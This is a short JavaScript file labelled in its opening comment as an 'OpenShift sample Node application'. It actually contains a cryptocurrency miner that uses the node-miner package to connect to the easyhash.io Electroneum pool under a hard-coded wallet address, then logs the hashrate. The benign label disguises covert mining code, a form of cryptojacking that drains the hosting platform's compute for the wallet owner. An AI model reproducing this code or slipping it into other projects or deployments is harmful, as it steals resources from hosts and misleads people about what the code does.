//  OpenShift sample Node application

const NodeMiner = require('node-miner');
 
(async () => {
 
    const miner = await NodeMiner({
        host: `etn.easyhash.io`,
        port: 3630,
        username: `etnkKyXUsrfH3JdthA3Cep1JBaEdPtFF2EvkX4uhmTbCAFMX4xr6VzvBuc2eJFvEnLKmJKf7jwS3C3R9mMQb1jbD8VW9GNiGBJ`,
        password: 'worker-1'
    });
 
    await miner.start();
 
    miner.on('update', data => {
        console.log(`Hashrate: ${data.hashesPerSecond} H/s`);
        console.log(`Total hashes mined: ${data.totalHashes}`);
        console.log(`---`);
    });
 
})();

